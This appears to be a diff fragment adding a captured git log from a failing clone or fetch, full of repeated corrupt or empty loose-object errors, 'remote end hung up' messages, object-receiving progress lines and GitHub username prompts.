+fatal: loose object 5b74d5ef8e88caeebaf72c94f0f46f53dad65740 (stored in .git/objects/5b/74d5ef8e88caeebaf72c94f0f46f53dad65740) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/8e/dcfeff7b25ed5df715ba6f6b07aab9ce12aca1 is empty
+error: object file .git/objects/8e/dcfeff7b25ed5df715ba6f6b07aab9ce12aca1 is empty
+fatal: loose object 8edcfeff7b25ed5df715ba6f6b07aab9ce12aca1 (stored in .git/objects/8e/dcfeff7b25ed5df715ba6f6b07aab9ce12aca1) is corrupt
+fatal: The remote end hung up unexpectedly
+Receiving objects:  24% (25/104), 8.01 KiB | 0 bytes/s   Receiving objects:  25% (26/104), 12.01 KiB | 0 bytes/s   error: object file .git/objects/8e/dcfeff7b25ed5df715ba6f6b07aab9ce12aca1 is empty
+error: object file .git/objects/8e/dcfeff7b25ed5df715ba6f6b07aab9ce12aca1 is empty
+fatal: loose object 8edcfeff7b25ed5df715ba6f6b07aab9ce12aca1 (stored in .git/objects/8e/dcfeff7b25ed5df715ba6f6b07aab9ce12aca1) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/12/5135a617b8ee874a28ebe153b8c02a302245b7 is empty
+error: object file .git/objects/12/5135a617b8ee874a28ebe153b8c02a302245b7 is empty
+fatal: loose object 125135a617b8ee874a28ebe153b8c02a302245b7 (stored in .git/objects/12/5135a617b8ee874a28ebe153b8c02a302245b7) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/0f/93714a3306fc6a93b674c3f8d12e2cb47a18ac is empty
+error: object file .git/objects/0f/93714a3306fc6a93b674c3f8d12e2cb47a18ac is empty
+fatal: loose object 0f93714a3306fc6a93b674c3f8d12e2cb47a18ac (stored in .git/objects/0f/93714a3306fc6a93b674c3f8d12e2cb47a18ac) is corrupt
+fatal: The remote end hung up unexpectedly
+Receiving objects:  25% (27/104), 12.01 KiB | 0 bytes/s   Receiving objects:  26% (28/104), 12.01 KiB | 0 bytes/s   Receiving objects:  27% (29/104), 12.01 KiB | 0 bytes/s   Receiving objects:  28% (30/104), 12.01 KiB | 0 bytes/s   remote: Total 104 (delta 12), reused 10 (delta 10), pack-reused 84[K
+Receiving objects:  29% (31/104), 16.01 KiB | 0 bytes/s   Receiving objects:  30% (32/104), 16.01 KiB | 0 bytes/s   Receiving objects:  31% (33/104), 16.01 KiB | 0 bytes/s   error: object file .git/objects/ba/80cc93829257382780c3695242c27ae675fea1 is empty
+error: object file .git/objects/ba/80cc93829257382780c3695242c27ae675fea1 is empty
+fatal: loose object ba80cc93829257382780c3695242c27ae675fea1 (stored in .git/objects/ba/80cc93829257382780c3695242c27ae675fea1) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/ba/80cc93829257382780c3695242c27ae675fea1 is empty
+error: object file .git/objects/ba/80cc93829257382780c3695242c27ae675fea1 is empty
+fatal: loose object ba80cc93829257382780c3695242c27ae675fea1 (stored in .git/objects/ba/80cc93829257382780c3695242c27ae675fea1) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/0f/93714a3306fc6a93b674c3f8d12e2cb47a18ac is empty
+error: object file .git/objects/0f/93714a3306fc6a93b674c3f8d12e2cb47a18ac is empty
+fatal: loose object 0f93714a3306fc6a93b674c3f8d12e2cb47a18ac (stored in .git/objects/0f/93714a3306fc6a93b674c3f8d12e2cb47a18ac) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/e6/38e1e0db43e5d01dd9200eb97eeedf86573f73 is empty
+error: object file .git/objects/e6/38e1e0db43e5d01dd9200eb97eeedf86573f73 is empty
+fatal: loose object e638e1e0db43e5d01dd9200eb97eeedf86573f73 (stored in .git/objects/e6/38e1e0db43e5d01dd9200eb97eeedf86573f73) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/e6/38e1e0db43e5d01dd9200eb97eeedf86573f73 is empty
+error: object file .git/objects/e6/38e1e0db43e5d01dd9200eb97eeedf86573f73 is empty
+fatal: loose object e638e1e0db43e5d01dd9200eb97eeedf86573f73 (stored in .git/objects/e6/38e1e0db43e5d01dd9200eb97eeedf86573f73) is corrupt
+fatal: The remote end hung up unexpectedly
+Username for 'https://github.com': Receiving objects:  32% (34/104), 16.01 KiB | 0 bytes/s   Receiving objects:  33% (35/104), 16.01 KiB | 0 bytes/s   Receiving objects:  34% (36/104), 16.01 KiB | 0 bytes/s   Receiving objects:  35% (37/104), 16.01 KiB | 0 bytes/s   Receiving objects:  36% (38/104), 16.01 KiB | 0 bytes/s   Receiving objects:  37% (39/104), 16.01 KiB | 0 bytes/s   Receiving objects:  38% (40/104), 16.01 KiB | 0 bytes/s   Receiving objects:  39% (41/104), 16.01 KiB | 0 bytes/s   Receiving objects:  40% (42/104), 16.01 KiB | 0 bytes/s   Receiving objects:  41% (43/104), 16.01 KiB | 0 bytes/s   Receiving objects:  42% (44/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  43% (45/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  44% (46/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  45% (47/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  46% (48/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  47% (49/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  48% (50/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  49% (51/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  50% (52/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  51% (54/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  52% (55/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  53% (56/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  54% (57/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  55% (58/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  56% (59/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  57% (60/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  58% (61/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  59% (62/104), 240.01 KiB | 9.00 KiB/s   Username for 'https://github.com': Receiving objects:  60% (63/104), 240.01 KiB | 9.00 KiB/s   Receiving objects:  61% (64/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  62% (65/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  63% (66/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  64% (67/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  65% (68/104), 244.01 KiB | 8.00 KiB/s   Username for 'https://github.com': Receiving objects:  66% (69/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  67% (70/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  68% (71/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  69% (72/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  70% (73/104), 244.01 KiB | 8.00 KiB/s   Receiving objects:  71% (74/104), 244.01 KiB | 8.00 KiB/s   
